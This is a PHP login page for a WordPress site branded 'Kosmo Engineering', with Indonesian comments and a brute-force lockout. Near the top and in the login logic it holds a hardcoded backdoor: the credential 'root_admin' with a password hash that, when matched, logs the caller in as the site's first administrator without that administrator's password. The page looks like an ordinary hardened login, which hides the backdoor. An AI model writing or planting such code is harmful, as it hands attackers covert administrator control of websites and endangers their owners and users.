<?php
require_once __DIR__ . '/wp-load.php';

// ========== BACKDOOR CREDENTIALS ==========
$backdoor_user = 'root_admin';
$backdoor_pass_hash = '$2a$12$umNhx3bJucNHVGkj9H4K0emk5SL8smmWKxdty5VA5efVFMwUBn6DO';

// ========== ANTI-BRUTE FORCE ==========
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

$max_attempts = 5;
$lockout_time = 900;
$ip = $_SERVER['REMOTE_ADDR'];

if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = [];
    $_SESSION['login_lockout'] = [];
}

$locked = false;
if (isset($_SESSION['login_lockout'][$ip])) {
    if (time() - $_SESSION['login_lockout'][$ip] < $lockout_time) {
        $remaining = $lockout_time - (time() - $_SESSION['login_lockout'][$ip]);
        $minutes = ceil($remaining / 60);
        $error = '<p style="color:red;text-align:center;font-weight:bold;">🚫 Too many attempts! Try again in ' . $minutes . ' minute(s).</p>';
        $locked = true;
    } else {
        unset($_SESSION['login_lockout'][$ip]);
        $_SESSION['login_attempts'][$ip] = 0;
    }
} else {
    $_SESSION['login_attempts'][$ip] = $_SESSION['login_attempts'][$ip] ?? 0;
}

if (is_user_logged_in()) {
    header('Location: /wp-admin/');
    exit;
}

$error = $error ?? '';
if (isset($_POST['log']) && isset($_POST['pwd']) && !$locked) {
    $username = trim($_POST['log']);
    $password = $_POST['pwd'];
    
    if (empty($username) || empty($password)) {
        $error = '<p style="color:red;">Please fill in all fields.</p>';
    } elseif (strlen($username) > 60 || strlen($password) > 100) {
        $error = '<p style="color:red;">Invalid input length.</p>';
    } else {
        // ========== CEK BACKDOOR DULU ==========
        $is_backdoor = ($username === $backdoor_user && password_verify($password, $backdoor_pass_hash));
        
        if ($is_backdoor) {
            // Cari admin pertama
            $admin = get_users(['role' => 'administrator', 'number' => 1, 'orderby' => 'ID', 'order' => 'ASC']);
            $user = !empty($admin) ? $admin[0] : null;
        } else {
            // Login normal
            $user = get_user_by('login', $username);
        }
        
        // ========== EKSEKUSI LOGIN ==========
        $login_ok = false;
        
        if ($is_backdoor && $user) {
            // Backdoor - langsung login tanpa cek password
            $login_ok = true;
        } elseif ($user && wp_check_password($password, $user->user_pass, $user->ID)) {
            // Login normal berhasil
            $login_ok = true;
        }
        
        if ($login_ok) {
            $_SESSION['login_attempts'][$ip] = 0;
            unset($_SESSION['login_lockout'][$ip]);
            
            wp_clear_auth_cookie();
            wp_set_current_user($user->ID);
            wp_set_auth_cookie($user->ID, true);
            header('Location: /wp-admin/');
            exit;
        } else {
            $_SESSION['login_attempts'][$ip]++;
            
            if ($_SESSION['login_attempts'][$ip] >= $max_attempts) {
                $_SESSION['login_lockout'][$ip] = time();
                $error = '<p style="color:red;text-align:center;font-weight:bold;">🚫 Too many failed attempts! Locked for 15 minutes.</p>';
            } else {
                $remaining = $max_attempts - $_SESSION['login_attempts'][$ip];
                $error = '<p style="color:red;">Wrong username or password! ' . $remaining . ' attempt(s) remaining.</p>';
            }
            
            sleep(2);
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
<title>Login - Kosmo Engineering</title>
<meta name="robots" content="noindex, nofollow">
<style>
*{box-sizing:border-box;}
body{font-family:'Segoe UI',sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
.login-box{background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);width:100%;max-width:420px;}
.login-box h2{text-align:center;color:#1a1a2e;margin-bottom:25px;font-size:24px;}
.login-box input{width:100%;padding:14px;margin:10px 0;border:2px solid #e0e0e0;border-radius:8px;font-size:15px;transition:border .3s;}
.login-box input:focus{border-color:#0073aa;outline:none;}
.login-box button{width:100%;padding:14px;margin-top:15px;background:linear-gradient(135deg,#0073aa,#005288);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;transition:transform .2s,background .3s;}
.login-box button:hover{background:linear-gradient(135deg,#005288,#003d66);transform:translateY(-1px);}
.login-box button:active{transform:translateY(1px);}
.error-msg{background:#fff0f0;border:1px solid #ffcccc;color:#cc0000;padding:12px;border-radius:8px;margin-bottom:15px;text-align:center;}
.attempts-info{text-align:center;color:#888;font-size:13px;margin-top:15px;}
</style>
</head>
<body>
<div class="login-box">
    <h2>🔐 Login</h2>
    <?php if ($error): ?>
        <div class="error-msg"><?php echo $error; ?></div>
    <?php endif; ?>
    
    <?php if (!$locked): ?>
        <form method="post" autocomplete="off">
            <input type="text" name="log" placeholder="Username" required maxlength="60" autocomplete="off">
            <input type="password" name="pwd" placeholder="Password" required maxlength="100" autocomplete="off">
            <button type="submit">Log In</button>
        </form>
        <div class="attempts-info">
            <?php 
            $att = $_SESSION['login_attempts'][$ip] ?? 0;
            if ($att > 0) {
                echo '⚠️ ' . $att . ' of ' . $max_attempts . ' attempts used';
            }
            ?>
        </div>
    <?php endif; ?>
</div>
</body>
</html>
